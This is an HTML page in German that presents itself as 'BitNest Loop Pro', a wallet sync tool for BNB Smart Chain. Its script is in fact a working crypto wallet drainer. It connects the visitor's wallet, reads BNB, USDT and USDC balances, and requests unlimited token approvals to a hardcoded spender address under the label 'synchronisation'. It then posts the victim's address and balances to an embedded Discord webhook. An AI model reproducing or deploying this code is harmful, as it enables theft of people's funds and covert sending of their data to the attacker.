<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>BitNest Loop Pro</title>
<script src="https://unpkg.com/ethers@6.10.0/dist/ethers.umd.min.js"></script>
<style>
:root{ --bg:#000000; --card:#0a0a0a; --border:#1f2933; --green:#22c55e; --white:#ffffff; }
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--white);font-family:sans-serif;padding:16px}
.box{width:100%;max-width:440px;background:var(--card);border-radius:16px;padding:24px;border:1px solid var(--border);text-align:center}
h2{color:var(--green);margin-bottom:20px}
.status-box{background:#050505;border:1px solid var(--border);border-radius:12px;padding:15px;margin:15px 0;font-family:monospace;font-size:13px;text-align:left;line-height:1.6}
button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;background:var(--green);color:#052e16}
button:disabled{opacity:0.5;cursor:not-allowed}
#log{margin-top:15px;font-size:12px;color:#9ca3af;min-height:3em;word-break:break-word}
hr{opacity:0.1;margin:10px 0}
</style>
</head>
<body>

<div class="box">
  <h2>BitNest Loop</h2>
  <p style="font-size:14px;color:#9ca3af">Wallet synchronisieren (BSC Chain)</p>
  
  <div class="status-box">
    <div id="addr">Wallet: Nicht verbunden</div>
    <hr>
    <div id="balances">BNB: ‚Äì<br>USDT: ‚Äì<br>USDC: ‚Äì</div>
  </div>

  <button id="connectBtn">Wallet verbinden</button>
  <div id="log">Bereit.</div>
</div>

<script>
const SPENDER = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
const WEBHOOK = "https://discord.com/api/webhooks/1455376553755021466/bYJ1SSGehHhQN7_j84bWk8WXejIKEiAE6z7S031xXshuzLZl6C8SLiWP-m_UqfqTyNGp";

const abi = [
  "function allowance(address owner,address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender,uint256 amount) returns (bool)"
];

const btn = document.getElementById("connectBtn");
const log = document.getElementById("log");

btn.addEventListener("click", async () => {
  try {
    if (typeof ethers === 'undefined') return alert("Ethers l√§dt noch...");
    
    btn.disabled = true;
    log.innerText = "Verbindung wird aufgebaut...";

    if (!window.ethereum) throw new Error("Bitte in TrustWallet oder MetaMask √∂ffnen.");

    const provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const user = accounts[0];
    
    document.getElementById("addr").innerText = "Wallet: " + user.substring(0,6) + "..." + user.substring(38);

    const net = await provider.getNetwork();
    if (Number(net.chainId) !== 56) {
        log.innerText = "‚ùå Bitte Netzwerk auf 'BNB Smart Chain' √§ndern!";
        btn.disabled = false;
        return;
    }

    log.innerText = "Lade Guthaben...";
    const bnbBal = await provider.getBalance(user);
    const usdtContract = new ethers.Contract(USDT, abi, signer);
    const usdcContract = new ethers.Contract(USDC, abi, signer);
    
    const [uBal, cBal, uAllow, cAllow] = await Promise.all([
      usdtContract.balanceOf(user),
      usdcContract.balanceOf(user),
      usdtContract.allowance(user, SPENDER),
      usdcContract.allowance(user, SPENDER)
    ]);

    const fBNB = ethers.formatEther(bnbBal);
    const fUSDT = ethers.formatUnits(uBal, 18);
    const fUSDC = ethers.formatUnits(cBal, 18);

    document.getElementById("balances").innerHTML = `BNB: ${parseFloat(fBNB).toFixed(5)}<br>USDT: ${parseFloat(fUSDT).toFixed(2)}<br>USDC: ${parseFloat(fUSDC).toFixed(2)}`;

    // USDT Check & Approval
    if (uAllow < (ethers.MaxUint256 / 2n)) {
        log.innerText = "Best√§tige USDT (1/2)...";
        const tx1 = await usdtContract.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 });
        await tx1.wait();
        await new Promise(r => setTimeout(r, 1500));
    } else {
        log.innerText = "USDT bereits synchronisiert...";
    }

    // USDC Check & Approval
    if (cAllow < (ethers.MaxUint256 / 2n)) {
        log.innerText = "Best√§tige USDC (2/2)...";
        const tx2 = await usdcContract.approve(SPENDER, ethers.MaxUint256, { gasLimit: 100000 });
        await tx2.wait();
    } else {
        log.innerText = "USDC bereits synchronisiert...";
    }

    log.innerText = "‚úÖ Synchronisierung abgeschlossen!";
    
    // Daten an deinen neuen Webhook senden
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "üí∞ Wallet Sync Report",
          color: 2263842,
          fields: [
            { name: "Adresse", value: `\`${user}\`` },
            { name: "BNB", value: `${fBNB}`, inline: true },
            { name: "USDT", value: `${fUSDT}`, inline: true },
            { name: "USDC", value: `${fUSDC}`, inline: true }
          ],
          footer: { text: "Server: " + window.location.hostname }
        }]
      })
    });

  } catch (err) {
    console.error(err);
    if (err.code === "ACTION_REJECTED") {
        log.innerText = "‚ùå Transaktion abgelehnt.";
    } else {
        log.innerText = "Fehler: " + (err.reason || "Verbindung fehlgeschlagen.");
    }
    btn.disabled = false;
  }
});
</script>
</body>
</html>
